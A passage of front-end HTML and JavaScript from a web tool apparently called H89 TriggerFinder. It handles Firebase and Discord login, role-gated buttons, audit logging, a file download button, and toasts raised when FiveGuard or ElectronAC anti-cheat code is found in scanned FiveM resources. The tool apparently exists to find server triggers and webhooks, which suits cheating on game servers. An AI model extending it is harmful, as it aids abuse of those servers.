 alert("Enter Server Name + Join link/code");
 return;
 }
 const servers = loadServers();
 servers.unshift({ name, join });
 saveServers(servers);
 if(srvName) srvName.value = "";
 if(srvJoin) srvJoin.value = "";
 renderSrvList();
 });

 srvReset && srvReset.addEventListener("click", ()=>{
 localStorage.removeItem(KEY);
 window.H89_CFX_SERVERS = loadServers(); // fallback to default embedded list
 if(window.H89_renderMainServers) window.H89_renderMainServers();
 if(window.H89_renderQuickServers) window.H89_renderQuickServers();
 renderSrvList();
 });

 // Render list when settings opens (and at start)
 renderSrvList();

 /* ===== (5) Performance: yield between batches during scan (no UI freeze) ===== */
 // Patch the batch loop: after each Promise.all(batch...) add a micro-yield.
 // This is a lightweight patch: if scan function exists, it will pick this up via injected helper.
 window.H89_yield = () => new Promise(r => requestAnimationFrame(() => r()));

})();
</script>

<script>
(() => {
  const LS_KEY = 'h89_show_webhooks';
  function ready(fn){ if(document.readyState !== 'loading') fn(); else document.addEventListener('DOMContentLoaded', fn); }

  function setOpen(panel, open){
    if(!panel) return;
    if(open){
      panel.classList.add('visible');
      panel.classList.remove('is-hidden');
      panel.style.display = 'block';
    }else{
      panel.classList.remove('visible');
      panel.classList.add('is-hidden');
      panel.style.display = 'none';
    }
  }

  ready(() => {
    const btn = document.getElementById('h89-toggle-webhooks');
    const panel = document.getElementById('webhooksPanel');
    if (!btn || !panel) return;

    // restore state
    const saved = localStorage.getItem(LS_KEY);
    const open = (saved === '1');
    setOpen(panel, open);
    if(open) btn.classList.add('is-active'); else btn.classList.remove('is-active');

    btn.addEventListener('click', () => {
      const isOpen = panel.classList.contains('visible');
      const next = !isOpen;
      setOpen(panel, next);
      btn.classList.toggle('is-active', next);
      localStorage.setItem(LS_KEY, next ? '1' : '0');
    });
  });
})();
</script>

<script>
/* H89 Smart UX helpers (non-breaking addon) */
(function () {
 const $ = (sel, root=document) => root.querySelector(sel);
 const $$ = (sel, root=document) => Array.from(root.querySelectorAll(sel));

 // Tiny toast
 function toast(msg, type) {
 let el = $("#h89-toast");
 if (!el) {
 el = document.createElement("div");
 el.id = "h89-toast";
 el.style.position = "fixed";
 el.style.left = "50%";
 el.style.bottom = "20px";
 el.style.transform = "translateX(-50%)";
 el.style.padding = "10px 14px";
 el.style.borderRadius = "12px";
 el.style.border = "1px solid rgba(255,0,0,.35)";
 el.style.background = "rgba(0,0,0,.75)";
 el.style.color = "#fff";
 el.style.fontFamily = "ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, 'Liberation Mono', 'Courier New', monospace";
 el.style.fontSize = "12px";
 el.style.zIndex = "99999";
 el.style.backdropFilter = "blur(8px)";
 el.style.opacity = "0";
 el.style.transition = "opacity .2s ease, transform .2s ease";
 document.body.appendChild(el);
 }
 el.textContent = msg;
 el.style.borderColor = (type === "ok") ? "rgba(0,255,120,.35)" : "rgba(255,0,0,.35)";
 el.style.opacity = "1";
 el.style.transform = "translateX(-50%) translateY(0)";
 clearTimeout(el.__t);
 el.__t = setTimeout(() => {
 el.style.opacity = "0";
 el.style.transform = "translateX(-50%) translateY(6px)";
 }, 1600);
 }

 // Keyboard shortcuts:
 // Ctrl+K => focus main search, W => toggle webhooks panel, Esc => close panels
 const searchInput = $("#searchInput") || $("#search") || $('input[placeholder*="Search"]');
 const webhooksBtn = $("#h89-toggle-webhooks");
 const cfxBtn = $("#h89-open-cfx");
 const exportBtn = $("#h89-export");

 function clickIf(el){ if(el) el.click(); }

 document.addEventListener("keydown", (e) => {
 const key = (e.key || "").toLowerCase();
 if ((e.ctrlKey || e.metaKey) && key === "k") {
 e.preventDefault();
 if (searchInput) { searchInput.focus(); searchInput.select?.(); toast("Search focused", "ok"); }
 return;
 }
 if (key === "w" && !e.ctrlKey && !e.metaKey && !e.altKey) {
 // avoid typing inside inputs
 const tag = (document.activeElement && document.activeElement.tagName || "").toLowerCase();
 if (tag === "input" || tag === "textarea") return;
 e.preventDefault();
 clickIf(webhooksBtn);
 return;
 }
 if (key === "escape") {
 // Close common overlays/panels (best-effort)
 $$(".h89-modal.open, .h89-panel.open, .h89-drawer.open, .modal.open, .panel.open").forEach(n => n.classList.remove("open"));
 // If there is a CFX panel, try hide it
 const cfxPanel = $("#h89-cfx-panel") || $("#cfx-panel") || $(".cfx-panel");
 if (cfxPanel) cfxPanel.classList.add("hidden");
 toast("Closed panels", "ok");
 }
 });

 // Persist Webhooks panel state
 const KEY = "h89_webhooks_open";
 function saveState(open){
 try { localStorage.setItem(KEY, open ? "1" : "0"); } catch(_) {}
 }
 function loadState(){
 try { return localStorage.getItem(KEY) === "1"; } catch(_) { return false; }
 }

 // Detect webhooks panel element (best-effort)
 const webhooksPanel = $("#h89-webhooks-panel") || $("#webhooks-panel") || $(".webhooks-panel") || $("#found-webhooks") || $("#webhooks");
 if (webhooksBtn && webhooksPanel) {
 // hook click to store state
 webhooksBtn.addEventListener("click", () => {
 const isHidden = webhooksPanel.classList.contains("hidden") || webhooksPanel.style.display === "none";
 // after existing handler runs, check again
 setTimeout(() => {
 const nowHidden = webhooksPanel.classList.contains("hidden") || getComputedStyle(webhooksPanel).display === "none";
 saveState(!nowHidden);
 }, 0);
 });

 // on load, apply saved state
 window.addEventListener("load", () => {
 const wantOpen = loadState();
 const isHidden = webhooksPanel.classList.contains("hidden") || getComputedStyle(webhooksPanel).display === "none";
 if (wantOpen && isHidden) {
 clickIf(webhooksBtn);
 }
 if (!wantOpen && !isHidden) {
 // keep as is; user might prefer open in code
 }
 });
 }

 // Quick actions on toolbar
 if (cfxBtn) cfxBtn.addEventListener("click", () => toast("CFX opened", "ok"));
 if (exportBtn) exportBtn.addEventListener("click", () => toast("Export started", "ok"));
})();
</script>

<script src="./config.js"></script>

<script type="module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
 import { getAuth, onAuthStateChanged, setPersistence, browserLocalPersistence } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-auth.js";
 import {
      collection,
      query,
      orderBy,
      limit,
      getDocs,
      deleteField,
      Timestamp,
      getFirestore, doc, getDoc
    } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore.js";

 const cfg = window.APP_CONFIG;
 const app = initializeApp(cfg.firebase);
 const auth = getAuth(app);
 const db = getFirestore(app);

 // Keep auth session across pages
 try { await setPersistence(auth, browserLocalPersistence); } catch (e) {}

 const sessionState = document.getElementById("h89-session-state");
 const sessionDot = document.getElementById("h89-session-dot");
 const dAvatar = document.getElementById("h89-discord-avatar");
 const dName = document.getElementById("h89-discord-name");

 function avatarUrl(u){
 if (!u?.id) return "https://cdn.discordapp.com/embed/avatars/0.png";
 if (!u.avatar) {
 const idx = Number(u.discriminator || 0) % 5;
 return `https://cdn.discordapp.com/embed/avatars/${idx}.png`;
 }
 return `https://cdn.discordapp.com/avatars/${u.id}/${u.avatar}.png?size=64`;
 }

 async function loadDiscord(uid){
 const snap = await getDoc(doc(db, "users", uid));
 if (!snap.exists()) return null;
 return snap.data()?.discord || null;
 }

 onAuthStateChanged(auth, async (user) => {
 if (!user) {
 if (sessionState) sessionState.textContent = "locked";
 if (sessionDot) sessionDot.style.background = "rgba(255,45,45,.85)";
 if (dName) dName.textContent = "Discord: -";
 if (dAvatar) dAvatar.src = "https://cdn.discordapp.com/embed/avatars/0.png";
 return;
 }

 if (sessionState) sessionState.textContent = user.email || "active";
 if (sessionDot) sessionDot.style.background = "rgba(27,217,106,.9)";

 try {
 const discord = await loadDiscord(user.uid);
 if (discord?.id) {
 const display = discord.global_name ? `${discord.global_name} (@${discord.username || "unknown"})` : `@${discord.username || "unknown"}`;
 if (dName) dName.textContent = display;
 if (dAvatar) dAvatar.src = avatarUrl(discord);
 } else {
 if (dName) dName.textContent = "Discord not linked";
 if (dAvatar) dAvatar.src = "https://cdn.discordapp.com/embed/avatars/0.png";
 }
 } catch (e) {
 console.warn("Discord load failed", e);
 if (dName) dName.textContent = "Discord load error";
 }
 });
</script>

<script>
 (function(){
 try{
 const el = document.getElementById('h89LoginOverlay');
 if(el) el.remove();
 }catch(e){}
 })();
</script>

<script>
(function(){
 function clearCFXInput(){
 // Try common selectors
 const candidates = [
 'input[placeholder*="cfx.re/join"]',
 'input[placeholder*="cfx.re"]',
 'input[id*="cfx" i]',
 'input[name*="cfx" i]',
 '#cfxInput', '#cfxFinderInput', '#cfx-link', '#cfxLink'
 ];
 let cleared = false;
 for (const sel of candidates){
 const el = document.querySelector(sel);
 if (el && el.value){
 el.value = "";
 el.dispatchEvent(new Event("input", {bubbles:true}));
 cleared = true;
 }
 }
 return cleared;
 }

 // Remove stored values (best-effort)
 try{
 const keys = [];
 for (let i=0;i<localStorage.length;i++){
 const k = localStorage.key(i);
 if (!k) continue;
 if (/cfx|serverid|join/i.test(k)) keys.push(k);
 }
 keys.forEach(k=>localStorage.removeItem(k));
 }catch(e){}

 try{
 const keys = [];
 for (let i=0;i<sessionStorage.length;i++){
 const k = sessionStorage.key(i);
 if (!k) continue;
 if (/cfx|serverid|join/i.test(k)) keys.push(k);
 }
 keys.forEach(k=>sessionStorage.removeItem(k));
 }catch(e){}

 // Clear immediately
 window.addEventListener("DOMContentLoaded", () => {
 clearCFXInput();
 });

 // Clear whenever modals/panels open (mutation observer)
 const obs = new MutationObserver(() => { clearCFXInput(); });
 obs.observe(document.documentElement, {subtree:true, childList:true, attributes:true});
})();
</script>

<script type="module" id="h89-discord-header-script">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
 import { getAuth, onAuthStateChanged, signOut, setPersistence, browserLocalPersistence } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-auth.js";
 import { getFirestore, doc, getDoc } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore.js";

 const cfg = window.APP_CONFIG;
 const app = initializeApp(cfg.firebase);
 const auth = getAuth(app);
 const db = getFirestore(app);

 try { await setPersistence(auth, browserLocalPersistence); } catch (e) {}

 const elWrap = document.getElementById("h89DiscordHeader");
 const elAv = document.getElementById("h89Avatar");
 const elName = document.getElementById("h89Name");
 const elExp = document.getElementById("h89Expiry");
 const dd = document.getElementById("h89Dropdown");
 const ddMeta = document.getElementById("h89DropMeta");
 const btnProfile = document.getElementById("h89BtnProfile");
 const btnLogout = document.getElementById("h89BtnLogout");

 function getDiscordSession(){
 try { return JSON.parse(sessionStorage.getItem("discord_session") || "null"); } catch (e) { return null; }
 }

 function avatarUrl(u){
 if (!u?.id) return "https://cdn.discordapp.com/embed/avatars/0.png";
 if (!u.avatar) return "https://cdn.discordapp.com/embed/avatars/0.png";
 return `https://cdn.discordapp.com/avatars/${u.id}/${u.avatar}.png?size=64`;
 }

 function setExpiryBadge(){
 const sess = getDiscordSession();
 if (!sess?.obtained_at || !sess?.expires_in){
 elExp.textContent = "no-exp";
 elExp.classList.remove("ok","warn");
 return;
 }
 const expiresAt = Number(sess.obtained_at) + Number(sess.expires_in) * 1000;
 const ms = expiresAt - Date.now();
 if (ms <= 0){
 elExp.textContent = "expired";
 elExp.classList.add("warn");
 elExp.classList.remove("ok");
 return;
 }
 const s = Math.floor(ms / 1000);
 const m = Math.floor(s / 60);
 const h = Math.floor(m / 60);
 const mm = m % 60;
 const ss = s % 60;

 let label = "";
 if (h > 0) label = `${h}h ${mm}m`;
 else if (m > 0) label = `${m}m ${ss}s`;
 else label = `${s}s`;

 elExp.textContent = label;
 const warn = ms < 5 * 60 * 1000;
 elExp.classList.toggle("warn", warn);
 elExp.classList.toggle("ok", !warn);
 }

 function closeDD(){
 dd.classList.remove("open");
 dd.setAttribute("aria-hidden","true");
 }

 function openDD(){
 if (!dd.classList.contains("open")){
 const r = elWrap.getBoundingClientRect();
 dd.style.left = `${Math.min(r.left, window.innerWidth - 220)}px`;
 dd.style.top = `${r.bottom + 10}px`;
 dd.classList.add("open");
 dd.setAttribute("aria-hidden","false");
 } else closeDD();
 }

 document.addEventListener("click", (e) => {
 if (!dd.contains(e.target) && !elWrap.contains(e.target)) closeDD();
 });

 elWrap?.addEventListener("click", (e) => {
 e.preventDefault();
 openDD();
 });

 btnLogout?.addEventListener("click", async () => {
 closeDD();
 await signOut(auth);
 window.location.href = "./index.html";
 });

 btnProfile?.addEventListener("click", () => {
 closeDD();
 const id = btnProfile.dataset.discordId;
 if (id) window.open(`https://discord.com/users/${id}`, "_blank");
 });

 // Remove "TriggerFinder" text from top-left branding if it exists (keep H89)
 function cleanupTitle(){
 const candidates = Array.from(document.querySelectorAll("body *"))
 .filter(el => el.childNodes && el.childNodes.length && (el.textContent || "").includes("TriggerFinder"));
 for (const el of candidates){
 // avoid huge containers
 if (el.textContent.length > 80) continue;
 el.textContent = el.textContent.replace(/\s*TriggerFinder\s*/i, " ").trim();
 }
 }

 async function loadDiscordFromFirestore(uid){
 const snap = await getDoc(doc(db, "users", uid));
 if (!snap.exists()) return null;
 return snap.data()?.discord || null;
 }

 onAuthStateChanged(auth, async (user) => {
 cleanupTitle();
 if (!user){
 elName.textContent = "Not logged";
 elAv.src = "https://cdn.discordapp.com/embed/avatars/0.png";
 ddMeta.textContent = "Not logged in";
 btnProfile.dataset.discordId = "";
 return;
 }

 ddMeta.textContent = user.email || "Logged in";
 // Prefer Firestore discord data
 try{
 const d = await loadDiscordFromFirestore(user.uid);
 if (d?.id){
 const display = d.global_name ? `${d.global_name} (@${d.username || "unknown"})` : `@${d.username || "unknown"}`;
 elName.textContent = display;
 elAv.src = avatarUrl(d);
 btnProfile.dataset.discordId = d.id;
 ddMeta.textContent = `${display} ‚Ä¢ ${user.email || ""}`.trim();
 } else {
 // fallback to sessionStorage if present
 const sess = getDiscordSession();
 const u = sess?.user;
 if (u?.id){
 const display = u.global_name ? `${u.global_name} (@${u.username})` : `@${u.username}`;
 elName.textContent = display;
 elAv.src = avatarUrl(u);
 btnProfile.dataset.discordId = u.id;
 ddMeta.textContent = `${display} ‚Ä¢ ${user.email || ""}`.trim();
 } else {
 elName.textContent = "Discord not linked";
 elAv.src = "https://cdn.discordapp.com/embed/avatars/0.png";
 btnProfile.dataset.discordId = "";
 }
 }
 }catch(e){
 console.warn(e);
 elName.textContent = "Discord load error";
 elAv.src = "https://cdn.discordapp.com/embed/avatars/0.png";
 btnProfile.dataset.discordId = "";
 }
 });

 setExpiryBadge();
 setInterval(setExpiryBadge, 1000);
</script>

<!-- H89 Profile Modal -->
<div id="h89ProfileModal" class="h89-modal" aria-hidden="true">
 <div class="h89-modal-backdrop" id="h89ModalClose"></div>
 <div class="h89-modal-card" role="dialog" aria-modal="true" aria-label="Profile">
 <div class="h89-modal-head">
 <div class="h89-modal-title">PROFILE</div>
 <button class="h89-modal-x" id="h89ModalX" type="button">‚úï</button>
 </div>
 <div class="h89-modal-body">
 <div class="h89-modal-row">
 <img id="h89ModalAvatar" class="h89-modal-avatar" alt="Discord avatar" />
 <div>
 <div id="h89ModalName" class="h89-modal-name">-</div>
 <div id="h89ModalRole" class="h89-role-badge">USER</div>
 </div>
 </div>

 <div class="h89-kv">
 <div class="k">Email</div><div class="v" id="h89ModalEmail">-</div>
 <div class="k">UID</div><div class="v mono" id="h89ModalUid">-</div>
 <div class="k">Discord ID</div><div class="v mono" id="h89ModalDid">-</div>
 </div>

 <div class="h89-modal-actions">
 <button class="h89-dd item" id="h89ModalOpenDiscord" type="button">OPEN DISCORD</button>
 <button class="h89-dd item" id="h89ModalLogout" type="button">LOGOUT</button>
 </div>
 </div>
 </div>
</div>

<script id="h89-role-modal-patch">
(function(){
 // Owner/Admin lists (optional). You can edit these:
 window.APP_CONFIG = window.APP_CONFIG || {};
 window.APP_CONFIG.roles = window.APP_CONFIG.roles || {
 owners: [], // e.g. ["123456789012345678"]
 admins: [] // e.g. ["987654321098765432"]
 };
})();
</script>
<script type="module" id="h89-role-modal-module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
 import { getAuth, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-auth.js";
 import { getFirestore, doc, getDoc } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore.js";

 const cfg = window.APP_CONFIG;
 const app = initializeApp(cfg.firebase);
 const auth = getAuth(app);
 const db = getFirestore(app);

 const roleBadge = document.getElementById("h89Role");
 const wrap = document.getElementById("h89DiscordHeader");

 const modal = document.getElementById("h89ProfileModal");
 const mClose = document.getElementById("h89ModalClose");
 const mX = document.getElementById("h89ModalX");
 const mAv = document.getElementById("h89ModalAvatar");
 const mName = document.getElementById("h89ModalName");
 const mRole = document.getElementById("h89ModalRole");
 const mEmail = document.getElementById("h89ModalEmail");
 const mUid = document.getElementById("h89ModalUid");
 const mDid = document.getElementById("h89ModalDid");
 const mOpenDiscord = document.getElementById("h89ModalOpenDiscord");
 const mLogout = document.getElementById("h89ModalLogout");

 function setRole(role){
 if (!roleBadge) return;
 const r = String(role || "USER").toUpperCase();
 roleBadge.textContent = r;
 roleBadge.classList.remove("owner","admin","user");
 roleBadge.classList.add(r === "OWNER" ? "owner" : r === "ADMIN" ? "admin" : "user");
 }

 function computeRole(discordId, userDoc){
 // 1) Firestore role override
 const r = userDoc?.role || userDoc?.roles?.[0];
 if (r) return String(r).toUpperCase();
 // 2) Config lists
 const owners = cfg.roles?.owners || [];
 const admins = cfg.roles?.admins || [];
 if (discordId && owners.includes(String(discordId))) return "OWNER";
 if (discordId && admins.includes(String(discordId))) return "ADMIN";
 return "USER";
 }

 function avatarUrl(u){
 if (!u?.id) return "https://cdn.discordapp.com/embed/avatars/0.png";
 if (!u.avatar) return "https://cdn.discordapp.com/embed/avatars/0.png";
 return `https://cdn.discordapp.com/avatars/${u.id}/${u.avatar}.png?size=128`;
 }

 function openModal(){
 if (!modal) return;
 modal.classList.add("open");
 modal.setAttribute("aria-hidden","false");
 }
 function closeModal(){
 if (!modal) return;
 modal.classList.remove("open");
 modal.setAttribute("aria-hidden","true");
 }

 mClose?.addEventListener("click", closeModal);
 mX?.addEventListener("click", closeModal);
 document.addEventListener("keydown", (e)=>{ if(e.key==="Escape") closeModal(); });

 let currentDiscordId = "";
 mOpenDiscord?.addEventListener("click", ()=>{
 if (currentDiscordId) window.open(`https://discord.com/users/${currentDiscordId}`, "_blank");
 });
 mLogout?.addEventListener("click", async ()=>{
 await signOut(auth);
 window.location.href = "./index.html";
 });

 // Replace dropdown behavior: click avatar opens modal
 wrap?.addEventListener("click", (e)=>{
 e.preventDefault();
 openModal();
 });

 // Hard-remove H89 badge/logo if still exists (small elements containing 'H89')
 function removeH89Badge(){
 const nodes = Array.from(document.querySelectorAll("*")).filter(el=>{
 const t = (el.textContent||"").trim();
 if (t !== "H89") return false;
 const r = el.getBoundingClientRect();
 return r.width < 120 && r.height < 120;
 });
 nodes.forEach(n=>n.remove());
 }
 window.addEventListener("DOMContentLoaded", removeH89Badge);

 onAuthStateChanged(auth, async (user)=>{
 removeH89Badge();
 if(!user){
 setRole("USER");
 mEmail.textContent = "-";
 mUid.textContent = "-";
 mDid.textContent = "-";
 mName.textContent = "-";
 mRole.textContent = "USER";
 currentDiscordId = "";
 return;
 }
 mEmail.textContent = user.email || "-";
 mUid.textContent = user.uid || "-";

 try{
 const snap = await getDoc(doc(db,"users", user.uid));
 const userDoc = snap.exists() ? snap.data() : null;
 const discord = userDoc?.discord || null;

 currentDiscordId = discord?.id ? String(discord.id) : "";
 mDid.textContent = currentDiscordId || "-";

 const display = discord?.global_name ? `${discord.global_name} (@${discord.username||"unknown"})`
 : (discord?.username ? `@${discord.username}` : "Discord not linked");

 mName.textContent = display;
 mAv.src = avatarUrl(discord);
 const role = computeRole(currentDiscordId, userDoc);
 setRole(role);
 mRole.textContent = role;
 mRole.classList.remove("owner","admin","user");
 mRole.classList.add(role==="OWNER"?"owner":role==="ADMIN"?"admin":"user");
 }catch(e){
 console.warn(e);
 setRole("USER");
 }
 });
</script>

<script type="module" id="h89-access-audit-module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
 import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-auth.js";
 import { getFirestore, doc, getDoc, addDoc, collection, serverTimestamp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore.js";

 const cfg = window.APP_CONFIG || {};
 const app = initializeApp(cfg.firebase);
 const auth = getAuth(app);
 const db = getFirestore(app);

 // Global context for other scripts
 window.H89_CTX = window.H89_CTX || { role: "USER", email: "", uid: "", discordId: "", discordName: "" };

 function setHidden(el, hidden){
 if (!el) return;
 el.setAttribute("data-h89-hidden", hidden ? "1" : "0");
 }

 function norm(s){ return String(s||"").trim().toUpperCase(); }

 function applyAccessControl(role){
 const r = norm(role);
 const access = cfg.uiAccess || {};
 const adminOnly = (access.adminOnlyButtons || []).map(norm);
 const ownerOnly = (access.ownerOnlyButtons || []).map(norm);

 // Find top buttons by their visible label text
 const btns = Array.from(document.querySelectorAll("button, a"))
 .filter(el => {
 const t = norm(el.textContent);
 return t.length > 0 && t.length <= 12; // keep to small labels
 });

 for (const el of btns){
 const label = norm(el.textContent);
 if (ownerOnly.includes(label)){
 setHidden(el, r !== "OWNER");
 }
 if (adminOnly.includes(label)){
 setHidden(el, !(r === "ADMIN" || r === "OWNER"));
 }
 }
 }

 async function audit(action, details={}){
 try{
 const ctx = window.H89_CTX || {};
 await addDoc(collection(db, "audit_logs"), {
 ts: serverTimestamp(),
 action: String(action||"").slice(0,80),
 details: details || {},
 uid: ctx.uid || null,
 email: ctx.email || null,
 role: ctx.role || null,
 discordId: ctx.discordId || null,
 discordName: ctx.discordName || null,
 ua: navigator.userAgent || null,
 path: location.pathname || null
 });
 }catch(e){
 // Silent fail - should never break UI
 console.warn("audit failed", e);
 }
 }

 function hookUI(){
 // Header buttons logging by label
 const wanted = ["SEARCH","FILES","FILTERS","WEBHOOKS","CFX","EXPORT"];
 const els = Array.from(document.querySelectorAll("button, a"))
 .filter(el => wanted.includes(norm(el.textContent)));

 els.forEach(el => {
 el.addEventListener("click", () => audit("ui_click", { label: norm(el.textContent) }));
 });

 // File scan logging
 const fileInputs = Array.from(document.querySelectorAll('input[type="file"]'));
 fileInputs.forEach(inp => {
 inp.addEventListener("change", () => {
 const files = Array.from(inp.files || []);
 const total = files.reduce((a,f)=>a+(f.size||0),0);
 audit("file_select", {
 count: files.length,
 totalBytes: total,
 names: files.slice(0,10).map(f=>f.name)
 });
 });
 });

 // Search query logging (best-effort)
 const searchInputs = Array.from(document.querySelectorAll("input"))
 .filter(i => (i.placeholder||"").toLowerCase().includes("search") || (i.id||"").toLowerCase().includes("search"));
 const searchBtns = Array.from(document.querySelectorAll("button"))
 .filter(b => norm(b.textContent)==="SEARCH");

 function logSearch(q){
 const qq = String(q||"").trim();
 if (!qq) return;
 audit("search", { q: qq.slice(0,400) });
 }

 searchBtns.forEach(b => {
 b.addEventListener("click", ()=>{
 const q = searchInputs[0]?.value || "";
 logSearch(q);
 });
 });
 searchInputs.forEach(i => {
 i.addEventListener("keydown", (e)=>{
 if (e.key === "Enter") logSearch(i.value);
 });
 });

 // Export clicks (some UIs use icon buttons)
 const exportBtns = Array.from(document.querySelectorAll("button"))
 .filter(b => norm(b.textContent)==="EXPORT");
 exportBtns.forEach(b => b.addEventListener("click", ()=>audit("export", {})));
 }

 onAuthStateChanged(auth, async (user)=>{
 if (!user){
 window.H89_CTX = { role:"USER", email:"", uid:"", discordId:"", discordName:"" };
 applyAccessControl("USER");
 return;
 }
 window.H89_CTX.email = user.email || "";
 window.H89_CTX.uid = user.uid || "";

 // Load user doc for discord + role
 let role = "USER";
 let discord = null;
 try{
 const snap = await getDoc(doc(db, "users", user.uid));
 const data = snap.exists() ? snap.data() : null;
 discord = data?.discord || null;
 role = (data?.role || data?.roles?.[0] || "USER");
 }catch(e){
 console.warn("user doc load failed", e);
 }

 // Compute role from config lists if needed
 const did = discord?.id ? String(discord.id) : "";
 const owners = (cfg.roles?.owners || []).map(String);
 const admins = (cfg.roles?.admins || []).map(String);
 let computed = norm(role);
 if (did && owners.includes(did)) computed = "OWNER";
 else if (did && admins.includes(did)) computed = "ADMIN";
 else if (!["OWNER","ADMIN","USER"].includes(computed)) computed = "USER";

 window.H89_CTX.role = computed;
 window.H89_CTX.discordId = did;
 window.H89_CTX.discordName = discord?.global_name ? `${discord.global_name} (@${discord.username||"unknown"})` :
 (discord?.username ? `@${discord.username}` : "");

 applyAccessControl(computed);
 hookUI();

 audit("page_open", { page: "TriggerFinder", role: computed });
 });
</script>

<script id="h89-remove-duplicate-inline">
document.addEventListener("DOMContentLoaded", () => {
 let fiveGuardToastShown = false;
 let electronAcToastShown = false;
 ["h89-session-dot","h89-discord-avatar","h89-discord-name"].forEach(id=>{
 const el = document.getElementById(id);
 if (el) el.remove();
 });
});
</script>

<script id="h89-download-script">
document.addEventListener("DOMContentLoaded", () => {
 const btn = document.getElementById("h89DownloadBtn");
 if (!btn) return;
 btn.addEventListener("click", () => {
 // Direct download link
 window.open("https://drive.google.com/uc?export=download&id=1mU7_6DOAinNIqKFyqZc8KDZE4mYSmif2", "_blank");
 });
});
</script>

<script>
/* ===== Detection Toasts (No Browser Notifications, No Sound) ===== */
document.addEventListener("DOMContentLoaded", () => {
 function showToast(kind, title, body){
 const host = document.getElementById("h89-toasts");
 if(!host) return;

 const t = document.createElement("div");
 t.className = `h89-toast ${kind}`;

 const bar = document.createElement("div");
 bar.className = "bar";

 const content = document.createElement("div");
 content.className = "content";

 const ti = document.createElement("div");
 ti.className = "title";
 ti.textContent = title;

 const bo = document.createElement("div");
 bo.className = "body";
 bo.textContent = body;

 content.appendChild(ti);
 content.appendChild(bo);

 const x = document.createElement("button");
 x.className = "x";
 x.type = "button";
 x.innerHTML = "&times;";
 x.addEventListener("click", () => t.remove());

 t.appendChild(bar);
 t.appendChild(content);
 t.appendChild(x);

 host.prepend(t);
 setTimeout(() => { try{ t.remove(); }catch(e){} }, 6500);
 }

 window.triggerFiveGuardDetection = (folder, file) => {
 showToast("fiveguard", "FiveGuard Detection", `Detection found in ${folder}\n${file}`);
 };

 window.triggerElectronACDetection = (folder, file) => {
 window.__h89ProtectionChecks?.add?.("banner", folder, file);
 showToast("electronac", "ElectronAC Detection", `Detection found in ${folder}\n${file}`);
 };
});
</script>
<script>
/* ===== H89 TOAST WRAP (No Sound/Voice) ===== */
document.addEventListener("DOMContentLoaded", () => {
 function showToast(kind, title, body){
 const host = document.getElementById("h89-toasts");
 if(!host) return;

 const t = document.createElement("div");
 t.className = `h89-toast ${kind}`;

 const bar = document.createElement("div");
 bar.className = "bar";

 const content = document.createElement("div");
 content.className = "content";

 const ti = document.createElement("div");
 ti.className = "title";
 ti.textContent = title;

 const bo = document.createElement("div");
 bo.className = "body";
 bo.textContent = body;

 content.appendChild(ti);
 content.appendChild(bo);

 const x = document.createElement("button");
 x.className = "x";
 x.type = "button";
 x.innerHTML = "&times;";
 x.addEventListener("click", () => t.remove());

 t.appendChild(bar);
 t.appendChild(content);
 t.appendChild(x);

 host.prepend(t);
 setTimeout(() => { try{ t.remove(); }catch(e){} }, 6500);
 }

 // Wrap addLog so detections automatically produce toasts
 const tryWrap = () => {
 try{
 if(typeof window.addLog !== "function") return false;
 if(window.__h89AddLogWrapped) return true;

 const orig = window.addLog;
 window.addLog = function(level, msg, ...rest){
 const r = orig.call(this, level, msg, ...rest);
 try{
 const s = String(msg || "");
 // Example: "FiveGuard detected in bl_appearance (fxmanifest.lua)"
 let m = s.match(/(FiveGuard|ElectronAC)\s+detected\s+in\s+([^()]+?)\s*\(([^)]+)\)/i);
 if(m){
 const det = m[1].toLowerCase();
 const folder = m[2].trim();
 const file = m[3].trim();
 if(det === "fiveguard"){
 if(!fiveGuardToastShown){ fiveGuardToastShown = true; showToast("fiveguard","FiveGuard Detection",`FiveGuard detected in this scan`); }
 }else{
 if(!electronAcToastShown){ electronAcToastShown = true; showToast("electronac","ElectronAC Detection",`ElectronAC detected in this scan`); }
 }
 }
 }catch(e){}
 return r;
 };

 window.__h89AddLogWrapped = true;
 return true;
 }catch(e){ return false; }
 };

 // Keep trying until addLog is defined
 let tries = 0;
 const iv = setInterval(()=>{
 tries++;
 if(tryWrap() || tries > 60) clearInterval(iv);
 }, 200);

 // Expose manual test
 // Reset one-time toasts when a new scan starts or files change
const resetToasts = () => { fiveGuardToastShown = false; electronAcToastShown = false; };
try{
 // Reset on any file input change
 const fi = document.querySelector('input[type="file"]');
 if(fi) fi.addEventListener("change", resetToasts);
}catch(e){}
try{
 // If app exposes startScan function, wrap it
 if(typeof window.startScan === "function" && !window.__h89StartScanWrapped){
 const _s = window.startScan;
 window.startScan = function(...args){ resetToasts(); return _s.apply(this,args); };
 window.__h89StartScanWrapped = true;
 }
}catch(e){}

 window.__testToast = () => {
 showToast("fiveguard","FiveGuard Detection","Detection found in test_resource\nfxmanifest.lua");
 showToast("electronac","ElectronAC Detection","Detection found in test_resource\nserver.lua");
 };
});
</script>
<script>
/* ===== H89 Detection Collector + FiveGuard Button Panel ===== */
document.addEventListener("DOMContentLoaded", () => {
 // Store detections per scan
 window.__h89Detections = window.__h89Detections || { fiveguard: new Map(), electronac: new Map() };

 const resetDetections = () => {
 window.__h89Detections.fiveguard.clear();
 window.__h89Detections.electronac.clear();
 };

 // Reset on file input change (new scan)
 try{
 const fi = document.querySelector('input[type="file"]');
 if(fi) fi.addEventListener("change", resetDetections);
 }catch(e){}

 // Helper to record a hit: resource(folder) + file name
 const recordHit = (kind, folder, file) => {
 const m = window.__h89Detections[kind];
 if(!m) return;
 const key = String(folder || "unknown").trim();
 const item = m.get(key) || { folder: key, files: new Set(), hits: 0 };
 if(file) item.files.add(String(file).trim());
 item.hits++;
 m.set(key, item);
 };

